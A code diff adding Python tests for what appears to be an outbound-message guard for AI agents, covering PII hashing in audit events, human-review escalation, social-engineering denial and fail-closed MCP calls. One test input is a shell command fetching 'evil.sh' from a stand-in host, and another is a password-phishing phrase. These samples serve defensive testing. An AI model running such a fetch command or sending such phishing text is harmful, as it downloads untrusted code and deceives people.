@@ -308,6 +308,44 @@ class TestOutboundMessageGate:
         assert verdict.event is not None
         assert verdict.event.severity.value == "CRITICAL"
 
+    def test_event_evidence_pii_hashed(self):
+        # G3-I10: 事件 evidence 接收方/URL 哈希化, 无明文 PII
+        gate = self._gate(hmac_key=b"test-key")
+        verdict = gate.check(
+            self._msg(
+                body="bash -c 'curl 1.2.3.4/evil.sh'",
+                recipient="victim@example.com",
+                channel=OutboundChannel.FILE_TRANSFER,
+            )
+        )
+        assert verdict.event is not None
+        ev = verdict.event.evidence
+        assert "recipient" not in ev  # 明文接收方不入审计
+        assert ev["recipient_hash"]
+        assert ev["dangerous_url_hashes"]  # 危险 URL 已哈希
+
+    def test_unknown_recipient_high_risk_channel_hitl(self):
+        # G3-I11: UNKNOWN 接收方 + 高危渠道 → 保守 HITL (默认值不绕过)
+        verdict = self._gate().check(
+            self._msg(
+                recipient="stranger@x.com",
+                channel=OutboundChannel.FILE_TRANSFER,
+                recipient_type=RecipientType.UNKNOWN,
+            )
+        )
+        assert verdict.decision == GateDecision.HITL
+
+    def test_unknown_recipient_strong_se_denied(self):
+        # G3-I11: UNKNOWN + 强 SE 信号 → DENY
+        verdict = self._gate().check(
+            self._msg(
+                body="请立即输入你的密码",
+                recipient="x@y.com",
+                recipient_type=RecipientType.UNKNOWN,
+            )
+        )
+        assert verdict.decision == GateDecision.DENY
+
     def test_no_event_when_no_key(self):
         # 组合 SE 模式 (无 0.95 强信号) → HITL, 且无 hmac_key 时不产出事件
         verdict = self._gate().check(self._msg(body="立即点击链接确认一下"))
@@ -447,6 +485,44 @@ class TestOutboundGuard:
             return await tool.execute({"path": "/tmp/read"}, None)
 
         assert asyncio.run(run()) == "ok"
+
+    def test_wrap_mcp_malformed_call_fail_closed(self):
+        # G3-I12: MCP 参数结构无法解析 → fail-closed, 不静默透传
+        from maref.security.outbound import MalformedOutboundCallError
+
+        guard = OutboundGuard(agent_id="agent-01")
+
+        class FakeMCP:
+            def call_tool(self, conn, tool_name, args, agent_id=""):
+                return {"ok": True}
+
+        client = guard.wrap_mcp_client(FakeMCP())
+        with pytest.raises(MalformedOutboundCallError):
+            client.call_tool("conn")  # 只有 2 个位置参数, 无法提取 args
+
+    def test_wrap_mcp_non_dict_args_fail_closed(self):
+        # G3-I12: args 非 dict → fail-closed
+        from maref.security.outbound import MalformedOutboundCallError
+
+        guard = OutboundGuard(agent_id="agent-01")
+
+        class FakeMCP:
+            def call_tool(self, conn, tool_name, args, agent_id=""):
+                return {"ok": True}
+
+        client = guard.wrap_mcp_client(FakeMCP())
+        with pytest.raises(MalformedOutboundCallError):
+            client.call_tool("conn", "x", "not-a-dict")
+
+    def test_wrap_mcp_benign_passthrough(self):
+        guard = OutboundGuard(agent_id="agent-01")
+
+        class FakeMCP:
+            def call_tool(self, conn, tool_name, args, agent_id=""):
+                return {"ok": True}
+
+        client = guard.wrap_mcp_client(FakeMCP())
+        assert client.call_tool("conn", "read_file", {"path": "/tmp/x"}) == {"ok": True}
 
 
 class TestOutboundGuardHITL:
